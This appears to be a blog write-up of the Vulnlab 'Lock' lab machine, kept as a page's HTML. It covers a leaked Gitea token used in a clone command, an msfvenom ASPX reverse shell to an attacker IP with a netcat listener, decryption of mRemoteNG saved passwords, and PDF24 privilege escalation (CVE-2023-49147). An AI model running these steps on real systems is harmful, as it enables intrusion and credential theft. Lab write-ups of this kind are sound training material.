@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Nmap12345678910111213141516171819202122Not shown: 995 filtered tcp ports (no-response)PORT     STATE SERVICE       REASON          VERSION80&#x2F;tcp   open  http          syn-ack ttl 127 Microsoft HTTPAPI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Lock">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/03/10/VL-Lock/index.html">
+<meta property="og:site_name" content="Panosoiko Blog">
+<meta property="og:description" content="Nmap12345678910111213141516171819202122Not shown: 995 filtered tcp ports (no-response)PORT     STATE SERVICE       REASON          VERSION80&#x2F;tcp   open  http          syn-ack ttl 127 Microsoft HTTPAPI">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Lock/Gitea-website.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Lock/Gitea-Token.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Lock/Readme-helpfull.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Lock/Shell-as-Elen.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Lock/RDP-PAss.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Lock/MSI-file.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Lock/RDP-exploits.png">
+<meta property="article:published_time" content="2025-03-09T22:30:31.000Z">
+<meta property="article:modified_time" content="2025-03-09T22:35:04.911Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="VL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Lock/Gitea-website.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Lock</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/08/VL-Baby/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/03/10/VL-Lock/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&text=VL-Lock"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&title=VL-Lock"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&is_video=false&description=VL-Lock"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Lock&body=Check out this article: https://panosoikogr.github.io/2025/03/10/VL-Lock/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&title=VL-Lock"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&title=VL-Lock"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&title=VL-Lock"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&title=VL-Lock"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&name=VL-Lock&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/03/10/VL-Lock/&t=VL-Lock"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">2.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gitea"><span class="toc-number">2.1.</span> <span class="toc-text">Gitea</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-Escalation"><span class="toc-number">3.</span> <span class="toc-text">Priv Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ellen-Freeman-to-Gale-Dekarios"><span class="toc-number">3.1.</span> <span class="toc-text">Ellen.Freeman to Gale.Dekarios</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PDF24-CVE-2023-49147"><span class="toc-number">3.2.</span> <span class="toc-text">PDF24 - CVE-2023-49147</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Lock
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-09T22:30:31.000Z" class="dt-published" itemprop="datePublished">2025-03-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/VL/" rel="tag">VL</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 995 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Lock - Index</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">3000/tcp open  ppp</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: LOCK</span><br><span class="line">|   NetBIOS_Domain_Name: LOCK</span><br><span class="line">|   NetBIOS_Computer_Name: LOCK</span><br><span class="line">|   DNS_Domain_Name: Lock</span><br><span class="line">|   DNS_Computer_Name: Lock</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-08T14:18:31+00:00</span><br><span class="line">5357/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0</span><br></pre></td></tr></table></figure>
+
+<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><h3 id="Gitea"><a href="#Gitea" class="headerlink" title="Gitea"></a>Gitea</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.69.227:3000/</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Lock/Gitea-website.png" alt="Gitea website"></p>
+<p>Possible Username: <code>ellen.freeman</code></p>
+<p>Looking into the commits we can find the gitea personal token:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.69.227:3000/ellen.freeman/dev-scripts/commit/8b78e6c3024416bce55926faa3f65421a25d6370</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Lock/Gitea-Token.png" alt="Gitea Token"></p>
+<p>Modifying the script so it uses the AUTH token:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def format_domain(domain):</span><br><span class="line">    if not domain.startswith((&#x27;http://&#x27;, &#x27;https://&#x27;)):</span><br><span class="line">        domain = &#x27;https://&#x27; + domain</span><br><span class="line">    return domain</span><br><span class="line"></span><br><span class="line">def get_repositories(token, domain):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &#x27;Authorization&#x27;: f&#x27;token &#123;token&#125;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    url = f&#x27;&#123;domain&#125;/api/v1/user/repos&#x27;</span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return response.json()</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(f&#x27;Failed to retrieve repositories: &#123;response.status_code&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print(&quot;Usage: python script.py &lt;gitea_domain&gt;&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    gitea_domain = format_domain(sys.argv[1])</span><br><span class="line"></span><br><span class="line">    personal_access_token = &#x27;TOKEN&#x27;  # Use the provided token directly</span><br><span class="line">    if not personal_access_token:</span><br><span class="line">        print(&quot;Error: GITEA_ACCESS_TOKEN environment variable not set.&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        repos = get_repositories(personal_access_token, gitea_domain)</span><br><span class="line">        print(&quot;Repositories:&quot;)</span><br><span class="line">        for repo in repos:</span><br><span class="line">            print(f&quot;- &#123;repo[&#x27;full_name&#x27;]&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>we will get back the 2 repos she has made </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Repositories:</span><br><span class="line">- ellen.freeman/dev-scripts</span><br><span class="line">- ellen.freeman/website</span><br></pre></td></tr></table></figure>
+
+<p>After cloning the website repo with the below command</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@lock.vl:3000/ellen.freeman/website.git</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Lock/Readme-helpfull.png" alt="Helpful Readme"><br>we see in the readme.md that any change we make on the repo it will reflect on the actual website so now we can create a .aspx shell and place it on the website.</p>
+<p>Generating a shell with msfvenom</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.5.195 LPORT=4444 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure>
+
+<p>And before we push our changes to the repo we need to setup git:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name ellen.freeman</span><br><span class="line">git config --global user.email ellen.freeman@lock.vl</span><br></pre></td></tr></table></figure>
+
+<p>Inside the repo we will add the new file, commit it and push it to the repo:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add shell.aspx</span><br><span class="line">git commit -m &quot;shell&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>
+
+<p>Then we start our listener and curl the wesbite for the shell to trigger:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -nlvp 4444</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://lock.vl/shell.aspx</span><br></pre></td></tr></table></figure>
+<p><code>Sometimes it takes a couple of minutes untill the pipeline builds the changes we did on the repository, do not do multiple pushes to the repo as it restarts the process</code><br><img src="/images/Lock/Shell-as-Elen.png" alt="Shell as Ellen"></p>
+<h2 id="Priv-Escalation"><a href="#Priv-Escalation" class="headerlink" title="Priv Escalation"></a>Priv Escalation</h2><h3 id="Ellen-Freeman-to-Gale-Dekarios"><a href="#Ellen-Freeman-to-Gale-Dekarios" class="headerlink" title="Ellen.Freeman to Gale.Dekarios"></a>Ellen.Freeman to Gale.Dekarios</h3><p>Inside the <code>Directory of c:\Users\ellen.freeman\Documents</code> there is a <code>config.xml</code><br>taking a look into the xml we can see that its a file for Multi-Remote Next Generation Connection Manager <a target="_blank" rel="noopener" href="https://mremoteng.org/">https://mremoteng.org/</a>. With a google search we can find a github repo that decripts the password that on the <code>config.xml</code><br><a target="_blank" rel="noopener" href="https://github.com/gquere/mRemoteNG_password_decrypt">https://github.com/gquere/mRemoteNG_password_decrypt</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/gquere/mRemoteNG_password_decrypt</span><br><span class="line">cd mRemoteNG_password_decrypt-master</span><br><span class="line">python3 mremoteng_decrypt.py ../config.xml</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Lock/RDP-PAss.png" alt="RDP Password"></p>
+<p>Using xfreerdp we will establish an rdp session with the machine</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.78.85 /u:Gale.Dekarios /p:</span><br></pre></td></tr></table></figure>
+
+<h3 id="PDF24-CVE-2023-49147"><a href="#PDF24-CVE-2023-49147" class="headerlink" title="PDF24 - CVE-2023-49147"></a>PDF24 - CVE-2023-49147</h3><p>After getting into the rdp session we can grab the user flag and see that there is a program called PDF24 after a simple google search we can see that there is a privilege escalation exploit for it <a target="_blank" rel="noopener" href="https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/">https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/</a></p>
+<p>First we need to locate the msi installer, after some digging around (dont forget to look for hidden folders)<br><img src="/images/Lock/MSI-file.png" alt="MSI file"></p>
+<p>Now we need to <code>SetOpLock.exe</code> to the machine, as we have rdp we can just copy paste it.</p>
+<p>We will open two terminals in one of them we will lock the log file</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetOpLock.exe &quot;C:\Program Files\PDF24\faxPrnInst.log&quot; r</span><br></pre></td></tr></table></figure>
+
+<p>And then we will patch the PDF24 app </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec.exe /fa C:\\_install\\pdf24-creator-11.15.1-x64.msi</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Lock/RDP-exploits.png" alt="RDP exploits"></p>
+<p>After you let it load you can follow the github instructions to get a shell:</p>
+<ul>
+<li>right click on the top bar of the cmd window</li>
+<li>click on properties</li>
+<li>under options click on the “Legacyconsolemode” link</li>
+<li>open the link with a browser other than internet explorer or edge (both don’t open as SYSTEM when on Win11)</li>
+<li>in the opened browser window press the key combination CTRL+o</li>
+<li>type cmd.exe in the top bar and press Enter</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=b0684778-d069-4d4a-ae3d-ce7e10d93464">https://api.vulnlab.com/api/v1/share?id=b0684778-d069-4d4a-ae3d-ce7e10d93464</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">2.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gitea"><span class="toc-number">2.1.</span> <span class="toc-text">Gitea</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-Escalation"><span class="toc-number">3.</span> <span class="toc-text">Priv Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ellen-Freeman-to-Gale-Dekarios"><span class="toc-number">3.1.</span> <span class="toc-text">Ellen.Freeman to Gale.Dekarios</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PDF24-CVE-2023-49147"><span class="toc-number">3.2.</span> <span class="toc-text">PDF24 - CVE-2023-49147</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/03/10/VL-Lock/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&text=VL-Lock"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&title=VL-Lock"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&is_video=false&description=VL-Lock"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Lock&body=Check out this article: https://panosoikogr.github.io/2025/03/10/VL-Lock/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&title=VL-Lock"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&title=VL-Lock"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&title=VL-Lock"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&title=VL-Lock"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/03/10/VL-Lock/&name=VL-Lock&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/03/10/VL-Lock/&t=VL-Lock"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
